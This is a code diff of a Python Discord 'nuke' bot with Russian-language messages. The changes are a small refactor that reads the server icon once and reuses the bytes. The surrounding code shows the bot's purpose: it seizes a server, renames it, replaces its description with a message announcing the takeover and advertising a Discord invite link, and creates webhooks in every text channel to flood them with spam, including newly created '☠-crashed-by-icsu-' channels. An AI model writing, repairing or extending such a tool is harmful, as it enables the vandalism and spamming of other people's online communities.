@@ -22,7 +22,7 @@ CRASH_DESCRIPTION = (
     "Сервер захвачен группировкой СЕООИ, переходите на наш сервер >>> https://discord.gg/jPzvYYjRSd"
 )
 
-pfp = open('icon.png', 'rb')
+pfp = open('icon.png', 'rb').read()
 
 def draw_menu():
     print(Fore.MAGENTA + r'''
@@ -111,8 +111,8 @@ async def spm_hook(webhook):
 async def create_hook(ctx):
     for chan in ctx.guild.text_channels:
         webhook = await chan.create_webhook(
-            name='ICSU',
-            avatar = pfp.read()
+            name = 'ICSU',
+            avatar = pfp
         )
 
         asyncio.gather(spm_hook(webhook))
@@ -175,9 +175,9 @@ async def nuke(ctx):
     log('~', "Выполняется краш сервера...")
 
     await guild.edit(
-        name=CRASH_SERVER_NAME, 
-        description=CRASH_DESCRIPTION,
-        icon = pfp.read()
+        name = CRASH_SERVER_NAME, 
+        description = CRASH_DESCRIPTION,
+        icon = pfp
     )
     
     start_time = discord.utils.utcnow() + datetime.timedelta(minutes=1)
@@ -208,7 +208,10 @@ async def nuke(ctx):
 @bot.event
 async def on_guild_channel_create(channel):
     if channel.name.startswith("☠-crashed-by-icsu-"):
-        webhook = await channel.create_webhook(name="ICSU", avatar=await channel.guild.icon.read())
+        webhook = await channel.create_webhook(
+            name = 'ICSU', 
+            avatar = pfp
+        )
         asyncio.gather(spm_hook(webhook))
 
 @bot.command()
